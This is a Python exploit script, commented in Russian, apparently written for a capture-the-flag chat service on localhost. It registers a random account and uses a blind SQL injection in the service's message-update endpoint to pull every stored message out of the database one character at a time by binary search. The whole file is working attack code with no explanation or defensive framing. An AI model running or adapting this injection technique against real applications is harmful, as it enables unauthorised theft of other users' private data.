import os
import json
import base64
import requests


# Функция для регистрации пользователя
def register(url, username, password):
    result = requests.post(
        f"{url}/api/v1/register", json={"login": username, "password": password}
    )
    return json.loads(result.text)


# Функция для создания чата
def create_chat(url, username, password):
    result = requests.post(
        f"{url}/api/v1/chats",
        auth=(username, password),
    )
    return json.loads(result.text)


# Функция для получения всех чатов
def get_chats(url, username, password):
    result = requests.get(
        f"{url}/api/v1/chats",
        auth=(username, password),
    )
    return json.loads(result.text)["data"]


# Написание сообщения в чат
def add_message(url, username, password, chat_id, message: str):
    result = requests.post(
        f"{url}/api/v1/chats/{chat_id}",
        auth=(username, password),
        json={
            "text": message,
            "direction": True,
        },
    )
    return json.loads(result.text)


# Функция для извлечения данных из чата
def get_messages(url, username, password, chat_id):
    result = requests.get(
        f"{url}/api/v1/chats/{chat_id}",
        auth=(username, password),
    )
    response = json.loads(result.text)
    return response["data"] if "data" in response else []


# Основная функция эксплойта
def pwn(url):
    # Создание аккаунта
    username = "enigma-" + os.urandom(8).hex()
    password = base64.urlsafe_b64encode(os.urandom(16)).decode()
    print(username, password)


    # Функция для обновления сообщения
    def update_message(msg_id, text):
        result = requests.post(
            f"{url}/api/v1/update_msg",
            auth=(username, password),
            json={
                "msg_id": msg_id,
                "text": text,
            },
        )
        try:
            return json.loads(result.text)
        except Exception as e:
            print(result.text)
            raise e


    # Функция для непосредственной эксплуатации Blind SQLi
    def blind_injection(msg_id, payload):
        update_message(
            msg_id,
            f"1' WHERE id = $1 AND {payload} --",
        )
        last_message = get_messages(url, username, password, last_chat["id"])[-1]
        update_message(msg_id, f"0")
        return last_message["text"] == "1"


    # Функция бинарного поиска
    def bsearch(msg_id, statement, l=0, r=256):
        while l < r:
            m = (l + r) // 2
            if blind_injection(msg_id, f"({statement}) > {m}"):
                l = m + 1
            else:
                r = m
        return l

    nth = lambda column, i: f"ASCII(RIGHT(LEFT({column}, {i + 1}), 1)) "

    register(url, username, password)
    create_chat(url, username, password)
    last_chat = get_chats(url, username, password)[-1]
    add_message(url, username, password, last_chat["id"], "0")
    last_message = get_messages(url, username, password, last_chat["id"])[-1]
    total_messages = bsearch(last_message["id"], "SELECT COUNT(*) FROM Messages")
    print("Total messages:", total_messages)
    messages = []

    for i in range(total_messages):
        message = ""
        msg_length = bsearch(
            last_message["id"], f"SELECT LENGTH(text) FROM Messages WHERE id = {i}"
        )
        
        for j in range(msg_length):
            msg_char = chr(
                bsearch(
                    last_message["id"],
                    f"SELECT {nth('text', j)} FROM Messages WHERE id = {i}",
                )
            )
            message += msg_char
        messages.append(message)
    print(messages)


pwn("http://localhost:31337")
